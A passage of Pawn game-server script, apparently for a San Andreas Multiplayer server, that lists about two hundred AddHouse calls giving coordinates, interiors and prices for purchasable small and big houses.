	AddHouse(66, -2903.929443, 1111.647705, 27.070312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 67);//A small house ;)
	AddHouse(67, -2904.486328, 1119.285644, 27.077573, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 68);//A small house ;)
	AddHouse(68, -2904.353027, 1154.682006, 13.664062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 69);//A small house ;)
	AddHouse(69, -2904.794433, 1165.063476, 13.664062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 70);//A small house ;)
	AddHouse(70, -2904.333251, 1171.768920, 13.664062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 71);//A small house ;)
	AddHouse(71, -2904.245849, 1178.875244, 13.664062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 72);//A small house ;)
	AddHouse(72, -2434.468017, 1338.265136, 8.511714, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 73); //A small house ;)
	AddHouse(73, -2477.078125, 1338.344482, 8.503883, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 74); //A small house ;)
	AddHouse(74, -2434.283691, 1318.488525, 13.867187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 75); //A small house ;)
	AddHouse(75, -2434.746826, 1311.063842, 15.645070, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 76); //A small house ;)
	AddHouse(76, -2476.205078, 1318.591308, 14.023437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 77); //A small house ;)
	AddHouse(77, -2475.240478, 1311.101318, 15.887753, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 78); //A small house ;)
	AddHouse(78, -2433.340576, 1301.349731, 18.382812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 79); //A small house ;)
	AddHouse(79, -2476.194091, 1301.150756, 18.447212, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 80); //A small house ;)
	AddHouse(80, -2434.319091, 1281.635986, 23.742187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 81); //A small house ;)
	AddHouse(81, -2476.737304, 1281.744384, 23.726562, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 82); //A small house ;)
	AddHouse(82, -2434.220458, 1274.172729, 25.396419, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 83); //A small house ;)
	AddHouse(83, -2475.631591, 1273.706420, 25.815700, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 84); //A small house ;)
	AddHouse(84, -2433.088134, 1264.239501, 28.257812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 85); //A small house ;)
	AddHouse(85, -2434.937011, 1245.190185, 33.957347, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 86); //A small house ;)
	AddHouse(86, -2476.881103, 1264.241577, 28.259193, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 87); //A small house ;)
	AddHouse(87, -2476.757812, 1244.171386, 33.609375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 88); //A small house ;)
	AddHouse(88, -2352.041748, 1226.905517, 33.079345, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 89); //A small house ;)
	AddHouse(89, -2381.673095, 1262.396484, 26.357065, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 90); //A small house ;)
	AddHouse(90, -2102.607910, 1162.431884, 53.361915, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 91); //A small house ;)
	AddHouse(91, -2084.192626, 1161.001953, 49.953125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 92); //A small house ;)
	AddHouse(92, -2157.563964, 1148.812377, 61.724403, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 93); //A small house ;)
	AddHouse(93, -2156.620117, 1117.542602, 74.416557, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 94); //A small house ;)
	AddHouse(94, -2160.009277, 1066.639282, 80.007812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 95); //A small house ;)
	AddHouse(95, -2126.827880, 1069.672851, 80.007812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 96); //A small house ;)
	AddHouse(96, -2157.486328, 1048.228027, 80.007812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 97); //A small house ;)
	AddHouse(97, -2158.511962, 1030.517578, 80.007812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 98); //A small house ;)
	AddHouse(98, -2127.239257, 1050.847778, 80.007812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 99); //A small house ;)
	AddHouse(99, -2158.626708, 1002.440490, 80.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 100); //A small house ;)
	AddHouse(100, -2158.432861, 983.610168, 80.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 101); //A small house ;)
	AddHouse(101, -2127.048339, 1032.693847, 80.007812, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 102); //A small house ;)
	AddHouse(102, -2158.680419, 965.976013, 80.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 103); //A small house ;)
	AddHouse(103, -2158.964355, 947.229553, 80.000000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 104); //A small house ;)
	AddHouse(104, -2155.762207, 644.946350, 52.367187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 105); //A small house ;)
	AddHouse(105, -2130.614746, 604.673767, 45.763473, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 106); //A small house ;)
	AddHouse(106, -2126.741943, 578.617675, 35.175041, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 107); //A small house ;)
	AddHouse(107, -2033.837158, 148.701080, 28.835937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 108);//A small house ;)
	AddHouse(108, -2720.586181, 14.807498, 4.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 109);//A small house ;)
	AddHouse(109, -2723.275634, 3.073014, 6.967911, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 110);//A small house ;)
	AddHouse(110, -2723.313964, -17.140789, 7.203125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 111); //A small house ;)
	AddHouse(111, -2720.882080, -23.498617, 4.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 112);//A small house ;)
	AddHouse(112, -2724.916259, -36.526435, 7.033369, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 113);//A small house ;)
	AddHouse(113, -2721.346435, -44.739822, 4.335937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 114);//A small house ;)
	AddHouse(114, -2723.019775, -58.260208, 4.342578, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 115); //A small house ;)
	AddHouse(115, -2790.320312, -180.689941, 9.704133, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 116);//A small house ;)
	AddHouse(116, -2791.656005, -161.847564, 9.847772, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 117);//A small house ;)
	AddHouse(117, -2793.421875, -153.233306, 7.187500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 118);//A small house ;)
	AddHouse(118, -2793.640869, -146.192733, 7.187500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 119);//A small house ;)
	AddHouse(119, -2792.119140, -133.826965, 10.054687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 120);//A small house ;)
	AddHouse(120, -2793.910644, -127.128852, 7.187500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 121);//A small house ;)
	AddHouse(121, -2791.572509, -111.177574, 7.201953, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 122);//A small house ;)
	AddHouse(122, -2792.797851, -107.292572, 7.655619, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 123);//A small house ;)
	AddHouse(123, 2513.847412, -1690.975463, 13.784167, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 124); //A small house ;)
	AddHouse(124, -2791.616455, -96.048217, 9.919806, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 125);//A small house ;)
	AddHouse(125, 2522.377929, -1679.002197, 15.496999, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 126);//A small house ;)
	AddHouse(126, -2792.776611, -82.778610, 7.195312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 127);//A small house ;)
	AddHouse(127, 2523.801269, -1658.687377, 15.493547, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 128);//A small house ;)
	AddHouse(128, 2513.101562, -1650.978393, 14.093794, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 129);//A small house ;)
	AddHouse(129, -2789.993408, -52.297504, 9.922229, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 130);//A small house ;)
	AddHouse(130, 2498.692138, -1643.224609, 13.782609, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 131);//A small house ;)
	AddHouse(131, 2486.610351, -1645.574218, 14.070312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 132);//A small house ;)
	AddHouse(132, -2792.637939, -35.780071, 7.761826, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 133);//A small house ;)
	AddHouse(133, 2469.812500, -1647.812011, 13.471319, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 134); //A small house ;)
	AddHouse(134, 2459.674560, -1690.804687, 13.541901, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 135);//A small house ;)
	AddHouse(135, -2791.587890, -23.401460, 9.814808, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 136); //A small house ;)
	AddHouse(136, -2193.096679, -2256.824951, 30.681972, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 137); //A small house ;)
	AddHouse(137, -2194.334960, -2254.998535, 30.695941, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 138); //A small house ;)
	AddHouse(138, -2192.455566, -2255.600341, 33.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 139); //A small house ;)
	AddHouse(139, -2199.787353, -2242.757324, 33.320312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 140); //A small house ;)
	AddHouse(140, -2179.880126, -2258.896972, 30.632862, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 141); //A small house ;)
	AddHouse(141, -2219.399902, -2400.900878, 32.582267, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 142); //A small house ;)
	AddHouse(142, -2238.603271, -2424.463867, 32.707267, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 143); //A small house ;)
	AddHouse(143, -2215.467773, -2451.784667, 31.812500, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 144); //A small house ;)
	AddHouse(144, -2224.144531, -2482.673339, 31.816272, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 145); //A small house ;)
	AddHouse(145, -2174.907470, -2481.833984, 31.816272, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 146); //A small house ;)
	AddHouse(146, -2199.343994, -2512.051757, 31.816270, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 147); //A small house ;)
	AddHouse(147, -2133.264160, -2512.638427, 31.816272, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 148); //A small house ;)
	AddHouse(148, -2102.784912, -2531.997070, 31.066806, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 149); //A small house ;)
	AddHouse(149, -2088.417480, -2511.319824, 31.066806, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 150); //A small house ;)
	AddHouse(150, -2075.362060, -2526.593017, 31.066806, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 151); //A small house ;)
	AddHouse(151, -2058.496093, -2503.571777, 31.066806, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 152); //A small house ;)
	AddHouse(152, -2075.293945, -2526.181152, 31.066806, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 153); //A small house ;)
	AddHouse(153, -2053.278076, -2544.384765, 31.066806, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 154); //A small house ;)
	AddHouse(154, -2081.382080, -2547.633544, 30.625000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 155); //A small house ;)
	AddHouse(155, 143.224105, -1470.016235, 25.203598, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 156); //A small house ;)
	AddHouse(156, 297.079193, -1335.486572, 53.441638, 235.30, 1190.04, 1080.25, 2000000, 1900000, 3, 157);//Big house
	AddHouse(157, 355.044647, -1279.730712, 53.703639, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 158); //A small house ;)
	AddHouse(158, 228.484451, -1404.329345, 51.611186, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 159); //A small house ;)
	AddHouse(159, 398.277099, -1271.297973, 50.019790, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 160); //A small house ;)
	AddHouse(160, 255.752578, -1366.078369, 53.109375, 235.30, 1190.04, 1080.25, 2000000, 1900000, 3, 161);//Big house
	AddHouse(161, 266.746582, -1289.164916, 74.632507, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 162);//Big house
	AddHouse(162, 252.331878, -1222.011230, 75.319137, 235.30, 1190.04, 1080.25, 1000000, 900000, 3, 163);//Big house
	AddHouse(163, 300.188354, -1154.798706, 81.263801, 225.79, 1025.77, 1084.00, 10000000, 9000000, 7, 164);//Big house
	AddHouse(164, 785.873046, -827.327880, 70.289581, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 165);//Big house
	AddHouse(165, 828.338012, -859.337890, 69.921875, 235.30, 1190.04, 1080.25, 500000, 450000, 3, 166);//Big house
	AddHouse(166, 835.993530, -894.024291, 68.768898, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 167);//Big house
	AddHouse(167, 936.834472, -846.698242, 93.859336, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 168);//Big house
	AddHouse(168, 1111.415527, -741.201965, 100.132926, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 169);//Big house
	AddHouse(169, 977.301818, -771.118469, 112.202629, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 170);//Big house
	AddHouse(170, 1094.034790, -806.078735, 107.417671, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 171);//Big house
	AddHouse(171, 898.135681, -677.465881, 116.890441, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 172);//Big house
	AddHouse(172, 946.237182, -710.716064, 122.619873, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 173);//Big house
	AddHouse(173, 980.171325, -677.452636, 121.976257, 235.30, 1190.04, 1080.25, 4000000, 3900000, 3, 174);//Big house
	AddHouse(174, 1497.221923, -689.006042, 95.166999, 225.79, 1025.77, 1084.00, 4000000, 3000000, 7, 175); //Big house
	AddHouse(175, 1045.166870, -641.238098, 120.117187, 235.30, 1190.04, 1080.25, 1000000, 900000, 3, 176);//Big house
	AddHouse(176, 1095.165039, -645.927307, 113.617851, 235.30, 1190.04, 1080.25, 1000000, 900000, 3, 177);//Big house
	AddHouse(177, 1526.392456, -774.503112, 79.890922, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 178); //A small house ;)
	AddHouse(178, 1532.954345, -800.267211, 72.584899, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 179); //A small house ;)
	AddHouse(179, 1540.178833, -850.792602, 64.336059, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 180); //A small house ;)
	AddHouse(180, 1536.326782, -884.340332, 57.657482, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 181); //A small house ;)
	AddHouse(181, 1469.328613, -904.503540, 54.835937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 182); //A small house ;)
	AddHouse(182, 1423.597045, -885.361633, 50.655788, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 183); //A small house ;)
	AddHouse(183, 1409.800415, -921.538024, 38.421875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 184);//A small house ;)
	AddHouse(184, 1439.306518, -927.725463, 39.640625, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 185);//A small house ;)
	AddHouse(185, 2105.602294, -1057.612426, 26.962291, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 186); //A small house ;)
	AddHouse(186, 2099.317138, -1052.824218, 28.353675, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 187); //A small house ;)
	AddHouse(187, 2077.702880, -1056.537841, 30.965749, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 188); //A small house ;)
	AddHouse(188, 2092.857421, -1048.290527, 29.730083, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 189); //A small house ;)
	AddHouse(189, 2082.224609, -1040.745727, 31.854156, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 190); //A small house ;)
	AddHouse(190, 2092.583496, -1067.003662, 27.619283, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 191); //A small house ;)
	AddHouse(191, 2102.840087, -1074.935791, 25.766048, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 192); //A small house ;)
	AddHouse(192, 2109.481445, -1081.330566, 24.896615, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 193); //A small house ;)
	AddHouse(193, 2156.067626, -1072.090087, 39.820198, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 194); //A small house ;)
	AddHouse(194, 2154.029541, -1242.550170, 25.354160, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 195); //A small house ;)
	AddHouse(195, 2133.398925, -1232.631713, 24.421875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 196); //A small house ;)
	AddHouse(196, 2192.272216, -1276.534790, 25.152664, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 197); //A small house ;)
	AddHouse(197, 2111.602783, -1242.456542, 25.732915, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 198); //A small house ;)
	AddHouse(198, 2090.375488, -1234.387695, 25.477499, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 199); //A small house ;)
	AddHouse(199, 2208.157470, -1281.440063, 24.790222, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 200); //A small house ;)
	AddHouse(200, 2091.741943, -1184.764038, 27.057060, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 201); //A small house ;)
	AddHouse(201, 2230.327148, -1281.165405, 25.367187, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 202); //A small house ;)
	AddHouse(202, 2090.988037, -1166.502197, 26.585937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 203); //A small house ;)
	AddHouse(203, 2094.713867, -1145.275878, 26.592920, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 204); //A small house ;)
	AddHouse(204, 2092.668701, -1123.557006, 27.689872, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 205); //A small house ;)
	AddHouse(205, 2081.809326, -1085.305297, 25.273912, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 206); //A small house ;)
	AddHouse(206, 2074.911376, -1083.413940, 24.984439, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 207); //A small house ;)
	AddHouse(207, 2060.697753, -1076.618774, 24.899299, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 208); //A small house ;)
	AddHouse(208, 2051.156738, -1067.685424, 25.554687, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 209); //A small house ;)
	AddHouse(209, 2036.251953, -1060.450439, 25.650810, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 210); //A small house ;)
	AddHouse(210, 2023.235107, -1054.418212, 25.596122, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 211); //A small house ;)
	AddHouse(211, 2094.891113, -1145.229003, 26.592920, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 212); //A small house ;)
	AddHouse(212, 2091.962402, -1166.623657, 26.585937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 213); //A small house ;)
	AddHouse(213, 2045.849731, -1115.514282, 26.361747, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 214); //A small house ;)
	AddHouse(214, 2091.670654, -1185.255004, 27.057060, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 215); //A small house ;)
	AddHouse(215, 2023.473632, -1121.601318, 26.379940, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 216); //A small house ;)
	AddHouse(216, 2000.187255, -1115.703369, 27.131803, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 217); //A small house ;)
	AddHouse(217, 1955.889160, -1116.405029, 27.830497, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 218); //A small house ;)
	AddHouse(218, 1939.260864, -1115.354003, 27.452295, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 219); //A small house ;)
	AddHouse(219, 1922.384033, -1116.674926, 26.859375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 220); //A small house ;)
	AddHouse(220, 1905.978027, -1113.865966, 26.664062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 221); //A small house ;)
	AddHouse(221, 1886.549072, -1114.131713, 26.275810, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 222); //A small house ;)
	AddHouse(222, 1853.977050, -1915.187255, 15.256797, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 223); //A small house ;)
	AddHouse(223, 1872.163452, -1913.161621, 15.256797, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 224); //A small house ;)
	AddHouse(224, 1892.119140, -1915.479858, 15.256797, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 225); //A small house ;)
	AddHouse(225, 1913.269287, -1913.566284, 15.256797, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 226); //A small house ;)
	AddHouse(226, 1928.790405, -1917.069824, 15.256797, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 227); //A small house ;)
	AddHouse(227, 1936.932006, -1911.375732, 15.256797, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 228); //A small house ;)
	AddHouse(228, 1908.237182, -2042.495483, 13.539081, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 229); //A small house ;)
	AddHouse(229, 1905.735717, -2042.271728, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 230); //A small house ;)
	AddHouse(230, 1868.455932, -2037.959350, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 231); //A small house ;)
	AddHouse(231, 1869.525512, -2030.403198, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 232); //A small house ;)
	AddHouse(232, 1872.035278, -2021.590942, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 233); //A small house ;)
	AddHouse(233, 1871.918823, -2019.503417, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 234); //A small house ;)
	AddHouse(234, 1895.606445, -2067.851562, 15.668893, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 235); //A small house ;)
	AddHouse(235, 1873.718994, -2069.729003, 15.497086, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 236); //A small house ;)
	AddHouse(236, 1851.655883, -2069.495605, 15.481237, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 237); //A small house ;)
	AddHouse(237, 1801.786254, -2100.097167, 13.850986, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 238); //A small house ;)
	AddHouse(238, 1781.637695, -2102.046630, 14.056648, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 239); //A small house ;)
	AddHouse(239, 2066.764892, -1703.728027, 14.148437, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 240); //A small house ;)
	AddHouse(240, 1762.596923, -2103.055664, 13.856951, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 241); //A small house ;)
	AddHouse(241, 2067.316650, -1656.432617, 13.858369, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 242); //A small house ;)
	AddHouse(242, 1734.304565, -2098.960937, 14.036639, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 243); //A small house ;)
	AddHouse(243, 2068.539062, -1643.537353, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 244); //A small house ;)
	AddHouse(244, 1711.550659, -2101.935058, 14.021014, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 245); //A small house ;)
	AddHouse(245, 2068.925292, -1628.865112, 13.876157, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 246); //A small house ;)
	AddHouse(246, 2069.618164, -1588.876220, 13.492008, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 247); //A small house ;)
	AddHouse(247, 1667.470947, -2107.626464, 14.072273, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 248); //A small house ;)
	AddHouse(248, 2065.386718, -1584.995727, 13.483137, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 249); //A small house ;)
	AddHouse(249, 1673.997070, -2120.955078, 13.975986, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 250); //A small house ;)
	AddHouse(250, 2072.063476, -1583.093261, 13.476417, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 251); //A small house ;)
	AddHouse(251, 2076.128906, -1587.283569, 13.485900, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 252); //A small house ;)
	AddHouse(252, 1695.328369, -2125.114501, 13.810076, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 253); //A small house ;)
	AddHouse(253, 1714.882690, -2124.055419, 13.875000, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 254); //A small house ;)
	AddHouse(254, 1734.812377, -2129.224365, 13.850986, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 255); //A small house ;)
	AddHouse(255, 1761.232055, -2123.426757, 13.546875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 256); //A small house ;)
	AddHouse(256, 2142.511718, -1606.536254, 14.306800, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 257);//Big house
	AddHouse(257, 1782.164672, -2125.362304, 13.897861, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 258); //A small house ;)
	AddHouse(258, 1804.067382, -2124.283935, 13.942373, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 259); //A small house ;)
	AddHouse(259, 2140.953369, -1652.135742, 15.085937, 235.30, 1190.04, 1080.25, 150000, 140000, 3, 260);//Big house
	AddHouse(260, 1851.380615, -2136.081787, 15.218173, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 261); //A small house ;)
	AddHouse(261, 1872.332031, -2133.796630, 15.481951, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 262); //A small house ;)
	AddHouse(262, 1894.214477, -2134.479980, 15.296298, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 263); //A small house ;)
	AddHouse(263, 295.118377, -1765.643676, 4.546226, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 264); //A small house ;)
	AddHouse(264, 281.256286, -1768.319946, 4.526916, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 265);//A small house ;)
	AddHouse(265, 207.258590, -1770.735351, 4.322935, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 266);//A small house ;)
	AddHouse(266, 192.311676, -1770.520751, 4.307473, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 267);//A small house ;)
	AddHouse(267, 169.052566, -1769.949584, 4.441358, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 268);//A small house ;)
	AddHouse(268, 743.163391, -590.351867, 18.012922, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 269); //A small house ;)
	AddHouse(269, 743.817504, -554.873718, 18.012926, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 270); //A small house ;)
	AddHouse(270, 743.776733, -511.470886, 18.012922, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 271); //A small house ;)
	AddHouse(271, 769.068603, -504.802368, 18.012926, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 272); //A small house ;)
	AddHouse(272, 766.249389, -555.116760, 18.012924, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 273); //A small house ;)
	AddHouse(273, 818.490600, -510.518035, 18.012922, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 274); //A small house ;)
	AddHouse(274, -2321.540771, 658.356445, 41.964229, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 275); //A small house ;)
	AddHouse(275, -2553.776123, 718.398681, 27.945312, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 276); //A small house ;)
	AddHouse(276, -2581.716552, 717.548889, 27.960891, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 277); //A small house ;)
	AddHouse(277, -2624.881347, 732.057861, 28.080543, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 278); //A small house ;)
	AddHouse(278, -2621.603027, 749.819274, 31.421875, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 279); //A small house ;)
	AddHouse(279, -2661.601074, 722.085693, 27.960582, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 280); //A small house ;)
	AddHouse(280, -2621.933593, 757.898376, 35.328125, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 281); //A small house ;)
	AddHouse(281, -2621.992431, 766.519409, 36.835937, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 282); //A small house ;)
	AddHouse(282, -2678.096191, 722.047607, 28.623416, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 283); //A small house ;)
	AddHouse(283, -2621.780029, 771.010131, 40.797225, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 284); //A small house ;)
	AddHouse(284, -2686.121582, 722.456848, 32.180091, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 285); //A small house ;)
	AddHouse(285, -2622.365966, 782.556396, 44.859375, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 286); //A small house ;)
	AddHouse(286, -2706.982666, 722.592651, 37.539062, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 287); //A small house ;)
	AddHouse(287, 989.688110, -828.523071, 95.468574, 222.98, 1239.83, 1082.14, 50000, 49000, 2, 288); //A small house ;)
